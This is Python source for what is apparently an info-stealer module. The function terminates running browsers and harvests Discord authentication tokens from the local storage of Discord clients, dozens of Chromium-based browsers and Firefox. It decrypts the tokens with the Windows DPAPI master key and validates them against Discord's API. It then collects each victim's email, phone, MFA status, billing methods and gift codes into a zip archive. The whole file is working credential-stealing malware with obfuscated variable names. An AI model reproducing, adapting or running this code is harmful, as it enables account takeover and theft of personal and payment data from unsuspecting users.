import os, re ,json, base64, psutil, requests
from win32crypt import CryptUnprotectData
from Cryptodome.Cipher import AES

def DiscordAccount(zip_file):
    file_discord_account = ""
    number_discord_account = 0

    def ExtractToken():  
        base_url = "https://discord.com/api/v9/users/@me"
        regexp = r"[\w-]{24}\.[\w-]{6}\.[\w-]{25,110}"
        regexp_enc = r"dQw4w9WgXcQ:[^\"]*"
        tokens = []
        uids = []
        token_info = {}

        # Get AppData paths for the current user
        path_appdata_local = os.getenv("LOCALAPPDATA")   # C:\Users\<User>\AppData\Local
        path_appdata_roaming = os.getenv("APPDATA")      # C:\Users\<User>\AppData\Roaming

        paths = [
            ("Discord",                os.path.join(path_appdata_roaming, "discord", "Local Storage", "leveldb"),                                                  ""),
            ("Discord Canary",         os.path.join(path_appdata_roaming, "discordcanary", "Local Storage", "leveldb"),                                            ""),
            ("Lightcord",              os.path.join(path_appdata_roaming, "Lightcord", "Local Storage", "leveldb"),                                                ""),
            ("Discord PTB",            os.path.join(path_appdata_roaming, "discordptb", "Local Storage", "leveldb"),                                               ""),
            ("Opera",                  os.path.join(path_appdata_roaming, "Opera Software", "Opera Stable", "Local Storage", "leveldb"),                           "opera.exe"),
            ("Opera GX",               os.path.join(path_appdata_roaming, "Opera Software", "Opera GX Stable", "Local Storage", "leveldb"),                        "opera.exe"),
            ("Opera Neon",             os.path.join(path_appdata_roaming, "Opera Software", "Opera Neon", "Local Storage", "leveldb"),                             "opera.exe"),
            ("Amigo",                  os.path.join(path_appdata_local,   "Amigo", "User Data", "Local Storage", "leveldb"),                                       "amigo.exe"),
            ("Torch",                  os.path.join(path_appdata_local,   "Torch", "User Data", "Local Storage", "leveldb"),                                       "torch.exe"),
            ("Kometa",                 os.path.join(path_appdata_local,   "Kometa", "User Data", "Local Storage", "leveldb"),                                      "kometa.exe"),
            ("Orbitum",                os.path.join(path_appdata_local,   "Orbitum", "User Data", "Local Storage", "leveldb"),                                     "orbitum.exe"),
            ("CentBrowser",            os.path.join(path_appdata_local,   "CentBrowser", "User Data", "Local Storage", "leveldb"),                                 "centbrowser.exe"),
            ("7Star",                  os.path.join(path_appdata_local,   "7Star", "7Star", "User Data", "Local Storage", "leveldb"),                              "7star.exe"),
            ("Sputnik",                os.path.join(path_appdata_local,   "Sputnik", "Sputnik", "User Data", "Local Storage", "leveldb"),                          "sputnik.exe"),
            ("Vivaldi",                os.path.join(path_appdata_local,   "Vivaldi", "User Data", "Default", "Local Storage", "leveldb"),                          "vivaldi.exe"),
            ("Google Chrome",          os.path.join(path_appdata_local,   "Google", "Chrome", "User Data", "Default", "Local Storage", "leveldb"),                 "chrome.exe"),
            ("Google Chrome",          os.path.join(path_appdata_local,   "Google", "Chrome", "User Data", "Profile 1", "Local Storage", "leveldb"),               "chrome.exe"),
            ("Google Chrome",          os.path.join(path_appdata_local,   "Google", "Chrome", "User Data", "Profile 2", "Local Storage", "leveldb"),               "chrome.exe"),
            ("Google Chrome",          os.path.join(path_appdata_local,   "Google", "Chrome", "User Data", "Profile 3", "Local Storage", "leveldb"),               "chrome.exe"),
            ("Google Chrome",          os.path.join(path_appdata_local,   "Google", "Chrome", "User Data", "Profile 4", "Local Storage", "leveldb"),               "chrome.exe"),
            ("Google Chrome",          os.path.join(path_appdata_local,   "Google", "Chrome", "User Data", "Profile 5", "Local Storage", "leveldb"),               "chrome.exe"),
            ("Google Chrome SxS",      os.path.join(path_appdata_local,   "Google", "Chrome SxS", "User Data", "Default", "Local Storage", "leveldb"),             "chrome.exe"),
            ("Google Chrome Beta",     os.path.join(path_appdata_local,   "Google", "Chrome Beta", "User Data", "Default", "Local Storage", "leveldb"),            "chrome.exe"),
            ("Google Chrome Dev",      os.path.join(path_appdata_local,   "Google", "Chrome Dev", "User Data", "Default", "Local Storage", "leveldb"),             "chrome.exe"),
            ("Google Chrome Unstable", os.path.join(path_appdata_local,   "Google", "Chrome Unstable", "User Data", "Default", "Local Storage", "leveldb"),        "chrome.exe"),
            ("Google Chrome Canary",   os.path.join(path_appdata_local,   "Google", "Chrome Canary", "User Data", "Default", "Local Storage", "leveldb"),          "chrome.exe"),
            ("Epic Privacy Browser",   os.path.join(path_appdata_local,   "Epic Privacy Browser", "User Data", "Local Storage", "leveldb"),                        "epic.exe"),
            ("Microsoft Edge",         os.path.join(path_appdata_local,   "Microsoft", "Edge", "User Data", "Default", "Local Storage", "leveldb"),                "msedge.exe"),
            ("Uran",                   os.path.join(path_appdata_local,   "uCozMedia", "Uran", "User Data", "Default", "Local Storage", "leveldb"),                "uran.exe"),
            ("Yandex",                 os.path.join(path_appdata_local,   "Yandex", "YandexBrowser", "User Data", "Default", "Local Storage", "leveldb"),          "yandex.exe"),
            ("Yandex Canary",          os.path.join(path_appdata_local,   "Yandex", "YandexBrowserCanary", "User Data", "Default", "Local Storage", "leveldb"),    "yandex.exe"),
            ("Yandex Developer",       os.path.join(path_appdata_local,   "Yandex", "YandexBrowserDeveloper", "User Data", "Default", "Local Storage", "leveldb"), "yandex.exe"),
            ("Yandex Beta",            os.path.join(path_appdata_local,   "Yandex", "YandexBrowserBeta", "User Data", "Default", "Local Storage", "leveldb"),      "yandex.exe"),
            ("Yandex Tech",            os.path.join(path_appdata_local,   "Yandex", "YandexBrowserTech", "User Data", "Default", "Local Storage", "leveldb"),      "yandex.exe"),
            ("Yandex SxS",             os.path.join(path_appdata_local,   "Yandex", "YandexBrowserSxS", "User Data", "Default", "Local Storage", "leveldb"),       "yandex.exe"),
            ("Brave",                  os.path.join(path_appdata_local,   "BraveSoftware", "Brave-Browser", "User Data", "Default", "Local Storage", "leveldb"),   "brave.exe"),
            ("Iridium",                os.path.join(path_appdata_local,   "Iridium", "User Data", "Default", "Local Storage", "leveldb"),                          "iridium.exe"),
        ]

        try:
            for v4r_name, v4r_path, v4r_proc_name in paths:
                for v4r_proc in psutil.process_iter(['pid', 'name']):
                    try:
                        if v4r_proc.name().lower() == v4r_proc_name.lower():
                            v4r_proc.terminate()
                    except:
                        pass
        except:
            pass

        for v4r_name, v4r_path, v4r_proc_name in paths:
            if not os.path.exists(v4r_path):

                continue
            v4r__d15c0rd = v4r_name.replace(" ", "").lower()
            if "cord" in v4r_path:
                if not os.path.exists(os.path.join(path_appdata_roaming, v4r__d15c0rd, 'Local State')):
                    continue
                for v4r_file_name in os.listdir(v4r_path):
                    if v4r_file_name[-3:] not in ["log", "ldb"]:
                        continue
                    v4r_total_path = os.path.join(v4r_path, v4r_file_name)
                    if os.path.exists(v4r_total_path):
                        with open(v4r_total_path, errors='ignore') as v4r_file:
                            for v4r_line in v4r_file:
                                for y in re.findall(regexp_enc, v4r_line.strip()):
                                    v4r_t0k3n = DecryptVal(base64.b64decode(y.split('dQw4w9WgXcQ:')[1]), GetMasterKey(os.path.join(path_appdata_roaming, v4r__d15c0rd, 'Local State')))
                                    if ValidateToken(v4r_t0k3n, base_url):
                                        v4r_uid = requests.get(base_url, headers={'Authorization': v4r_t0k3n}).json()['id']
                                        if v4r_uid not in uids:
                                            tokens.append(v4r_t0k3n)
                                            uids.append(v4r_uid)
                                            token_info[v4r_t0k3n] = (v4r_name, v4r_total_path)
            else:
                for v4r_file_name in os.listdir(v4r_path):
                    if v4r_file_name[-3:] not in ["log", "ldb"]:
                        continue
                    v4r_total_path = os.path.join(v4r_path, v4r_file_name)
                    if os.path.exists(v4r_total_path):
                        with open(v4r_total_path, errors='ignore') as v4r_file:
                            for v4r_line in v4r_file:
                                for v4r_t0k3n in re.findall(regexp, v4r_line.strip()):
                                    if ValidateToken(v4r_t0k3n, base_url):
                                        v4r_uid = requests.get(base_url, headers={'Authorization': v4r_t0k3n}).json()['id']
                                        if v4r_uid not in uids:
                                            tokens.append(v4r_t0k3n)
                                            uids.append(v4r_uid)
                                            token_info[v4r_t0k3n] = (v4r_name, v4r_total_path)

        if os.path.exists(os.path.join(path_appdata_roaming, "Mozilla", "Firefox", "Profiles")):
            for v4r_path, _, v4r_files in os.walk(os.path.join(path_appdata_roaming, "Mozilla", "Firefox", "Profiles")):
                for v4r__file in v4r_files:
                    if v4r__file.endswith('.sqlite'):
                        with open(os.path.join(v4r_path, v4r__file), errors='ignore') as v4r_file:
                            for v4r_line in v4r_file:
                                for v4r_t0k3n in re.findall(regexp, v4r_line.strip()):
                                    if ValidateToken(v4r_t0k3n, base_url):
                                        v4r_uid = requests.get(base_url, headers={'Authorization': v4r_t0k3n}).json()['id']
                                        if v4r_uid not in uids:
                                            tokens.append(v4r_t0k3n)
                                            uids.append(v4r_uid)
                                            token_info[v4r_t0k3n] = ('Firefox', os.path.join(v4r_path, v4r__file))
        return tokens, token_info

    def ValidateToken(v4r_t0k3n, base_url):
        return requests.get(base_url, headers={'Authorization': v4r_t0k3n}).status_code == 200

    def DecryptVal(v4r_buff, v4r_master_key):
        v4r_iv = v4r_buff[3:15]
        v4r_payload = v4r_buff[15:]
        v4r_cipher = AES.new(v4r_master_key, AES.MODE_GCM, v4r_iv)
        return v4r_cipher.decrypt(v4r_payload)[:-16].decode()

    def GetMasterKey(v4r_path):
        if not os.path.exists(v4r_path):
            return None
        with open(v4r_path, "r", encoding="utf-8") as v4r_f:
            v4r_local_state = json.load(v4r_f)
        v4r_master_key = base64.b64decode(v4r_local_state["os_crypt"]["encrypted_key"])[5:]
        return CryptUnprotectData(v4r_master_key, None, None, None, 0)[1]

    tokens, token_info = ExtractToken()
    
    if not tokens:
        file_discord_account = "No discord tokens found."

    for v4r_t0k3n_d15c0rd in tokens:
        number_discord_account += 1

        try: v4r_api = requests.get('https://discord.com/api/v8/users/@me', headers={'Authorization': v4r_t0k3n_d15c0rd}).json()
        except: v4r_api = {"None": "None"}

        v4r_u53rn4m3_d15c0rd = v4r_api.get('username', "None") + '#' + v4r_api.get('discriminator', "None")
        v4r_d15pl4y_n4m3_d15c0rd = v4r_api.get('global_name', "None")
        v4r_us3r_1d_d15c0rd = v4r_api.get('id', "None")
        v4r_em4i1_d15c0rd = v4r_api.get('email', "None")
        v4r_em4il_v3rifi3d_d15c0rd = v4r_api.get('verified', "None")
        v4r_ph0n3_d15c0rd = v4r_api.get('phone', "None")
        v4r_c0untry_d15c0rd = v4r_api.get('locale', "None")
        v4r_mf4_d15c0rd = v4r_api.get('mfa_enabled', "None")

        try:
            if v4r_api.get('premium_type', 'None') == 0:
                v4r_n1tr0_d15c0rd = 'False'
            elif v4r_api.get('premium_type', 'None') == 1:
                v4r_n1tr0_d15c0rd = 'Nitro Classic'
            elif v4r_api.get('premium_type', 'None') == 2:
                v4r_n1tr0_d15c0rd = 'Nitro Boosts'
            elif v4r_api.get('premium_type', 'None') == 3:
                v4r_n1tr0_d15c0rd = 'Nitro Basic'
            else:
                v4r_n1tr0_d15c0rd = 'False'
        except:
            v4r_n1tr0_d15c0rd = "None"

        try: v4r_av4t4r_ur1_d15c0rd = f"https://cdn.discordapp.com/avatars/{v4r_us3r_1d_d15c0rd}/{v4r_api['avatar']}.gif" if requests.get(f"https://cdn.discordapp.com/avatars/{v4r_us3r_1d_d15c0rd}/{v4r_api['avatar']}.gif").status_code == 200 else f"https://cdn.discordapp.com/avatars/{v4r_us3r_1d_d15c0rd}/{v4r_api['avatar']}.png"
        except: v4r_av4t4r_ur1_d15c0rd = "None"

        try:
            v4r_billing_discord = requests.get('https://discord.com/api/v6/users/@me/billing/payment-sources', headers={'Authorization': v4r_t0k3n_d15c0rd}).json()
            if v4r_billing_discord:
                v4r_p4ym3nt_m3th0d5_d15c0rd = []

                for v4r_method in v4r_billing_discord:
                    if v4r_method['type'] == 1:
                        v4r_p4ym3nt_m3th0d5_d15c0rd.append('Bank Card')
                    elif v4r_method['type'] == 2:
                        v4r_p4ym3nt_m3th0d5_d15c0rd.append("Paypal")
                    else:
                        v4r_p4ym3nt_m3th0d5_d15c0rd.append('Other')
                v4r_p4ym3nt_m3th0d5_d15c0rd = ' / '.join(v4r_p4ym3nt_m3th0d5_d15c0rd)
            else:
                v4r_p4ym3nt_m3th0d5_d15c0rd = "None"
        except:
            v4r_p4ym3nt_m3th0d5_d15c0rd = "None"

        try:
            v4r_gift_codes = requests.get('https://discord.com/api/v9/users/@me/outbound-promotions/codes', headers={'Authorization': v4r_t0k3n_d15c0rd}).json()
            if v4r_gift_codes:
                v4r_codes = []
                for v4r_g1ft_c0d35_d15c0rd in v4r_gift_codes:
                    v4r_name = v4r_g1ft_c0d35_d15c0rd['promotion']['outbound_title']
                    v4r_g1ft_c0d35_d15c0rd = v4r_g1ft_c0d35_d15c0rd['code']
                    v4r_data = f"Gift: \"{v4r_name}\" Code: \"{v4r_g1ft_c0d35_d15c0rd}\""
                    if len('\n\n'.join(v4r_g1ft_c0d35_d15c0rd)) + len(v4r_data) >= 1024:
                        break
                    v4r_codes.append(v4r_data)
                if len(v4r_codes) > 0:
                    v4r_g1ft_c0d35_d15c0rd = '\n\n'.join(v4r_codes)
                else:
                    v4r_g1ft_c0d35_d15c0rd = "None"
            else:
                v4r_g1ft_c0d35_d15c0rd = "None"
        except:
            v4r_g1ft_c0d35_d15c0rd = "None"
    
        try: v4r_software_name, v4r_path = token_info.get(v4r_t0k3n_d15c0rd, ("Unknown", "Unknown"))
        except: v4r_software_name, v4r_path = "Unknown", "Unknown"

        file_discord_account = file_discord_account + f"""
Discord Account n°{str(number_discord_account)}:
 - Path Found      : {v4r_path}
 - Software        : {v4r_software_name}
 - Token           : {v4r_t0k3n_d15c0rd}
 - Username        : {v4r_u53rn4m3_d15c0rd}
 - Display Name    : {v4r_d15pl4y_n4m3_d15c0rd}
 - Id              : {v4r_us3r_1d_d15c0rd}
 - Email           : {v4r_em4i1_d15c0rd}
 - Email Verified  : {v4r_em4il_v3rifi3d_d15c0rd}
 - Phone           : {v4r_ph0n3_d15c0rd}
 - Nitro           : {v4r_n1tr0_d15c0rd}
 - Language        : {v4r_c0untry_d15c0rd}
 - Billing         : {v4r_p4ym3nt_m3th0d5_d15c0rd}
 - Gift Code       : {v4r_g1ft_c0d35_d15c0rd}
 - Profile Picture : {v4r_av4t4r_ur1_d15c0rd}
 - Multi-Factor Authentication : {v4r_mf4_d15c0rd}
"""
    zip_file.writestr(f"Discord Accounts ({number_discord_account}).txt", file_discord_account)

    return number_discord_account

